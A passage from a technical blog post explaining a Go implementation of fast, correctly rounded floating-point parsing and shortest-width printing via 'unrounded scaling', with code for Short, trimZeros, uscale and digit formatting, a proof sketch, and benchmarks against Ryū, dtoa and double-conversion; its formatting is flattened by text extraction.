53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn 